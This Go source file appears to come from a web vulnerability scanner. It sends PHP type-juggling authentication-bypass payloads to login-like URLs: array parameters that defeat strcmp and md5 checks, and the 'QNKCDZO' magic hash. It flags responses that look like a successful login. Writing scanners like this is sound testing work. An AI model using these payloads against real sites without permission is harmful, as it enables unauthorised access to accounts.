package typejuggling

import (
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/yupiyy/bhyakugan/internal/core"
)

type JugglingPayload struct {
	Name    string
	Payload string
}

var JugglingPayloads = []JugglingPayload{
	{"PHP Array Juggling (strcmp bypass)", "?user=admin&pass%5B%5D="},
	{"PHP Array Juggling (md5 bypass)", "?hash%5B%5D="},
	{"PHP Magic Hash (QNKCDZO)", "?pass=QNKCDZO"},
}

func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if baseURL[len(baseURL)-1] != '/' {
		baseURL += "/"
	}

	// Rule: Endpoint Context Awareness (Anti-FP)
	// Only run on endpoints likely to have auth logic
	lowerBase := strings.ToLower(baseURL)
	isAuthPath := strings.Contains(lowerBase, "login") || 
				  strings.Contains(lowerBase, "auth") || 
				  strings.Contains(lowerBase, "signin") || 
				  strings.Contains(lowerBase, "user") ||
				  strings.Contains(lowerBase, "session") ||
				  strings.Contains(lowerBase, "admin")

	if !isAuthPath {
		return
	}

	// 1. Get Baseline (Control Request)
	baseResp, _ := client.Get(baseURL + "?bhyakugan_control=true")
	baseLen := -1
	if baseResp != nil {
		// FP Check: Tech Stack Detection
		// GitHub uses Rails. PHP attacks won't work.
		headers := baseResp.Header
		if headers.Get("X-GitHub-Request-Id") != "" || 
		   strings.Contains(strings.ToLower(headers.Get("Server")), "github") ||
		   headers.Get("X-Runtime") != "" { // Rails standard header
			baseResp.Body.Close()
			return // Skip PHP checks on non-PHP stacks
		}

		b, _ := io.ReadAll(baseResp.Body)
		baseLen = len(b)
		baseResp.Body.Close()
	}

	for _, p := range JugglingPayloads {
		target := baseURL + p.Payload
		resp, err := client.Get(target)
		if err != nil { continue }
		
		bodyBytes, _ := io.ReadAll(resp.Body)
		bodyStr := strings.ToLower(string(bodyBytes))
		bodyLen := len(bodyBytes)
		resp.Body.Close()

		// --- SMART FILTERING ---
		// 1. Ignore if identical to baseline length
		if bodyLen == baseLen { continue }

		// 2. Ignore if difference is too small (e.g. dynamic timestamps in HTML)
		diff := bodyLen - baseLen
		if diff < 0 { diff = -diff }
		if diff < 50 { continue } // Small noise

		// 3. WAF Detection
		if strings.Contains(bodyStr, "incapsula") || strings.Contains(bodyStr, "request rejected") || strings.Contains(bodyStr, "firewall") { continue }

		// 4. Success Indicators (Be extremely strict)
		// It's not enough to just differ. Must look like a LOGIN SUCCESS.
		success := false
		
		// Strong indicators of a session being created or dashboard access
		strongIndicators := []string{"logout", "session_id", "my account", "welcome,", "logged in as"}
		for _, ind := range strongIndicators {
			if strings.Contains(bodyStr, ind) {
				success = true
				break
			}
		}

		// Negative check: If baseline already had these, it's not a new success
		// (Assume Scan function has access to baseBodyStr or similar, but for now we rely on the list)

		if success {
			fmt.Printf("[!] VALID JUGGLING MATCH: %s at %s\n", p.Name, target)
			onFound(core.Finding{
				Type:     "PHP Type Juggling",
				Target:   target,
				Detail:   fmt.Sprintf("%s detected. Response differs from baseline.", p.Name),
				Severity: "High",
			})
		}
	}
}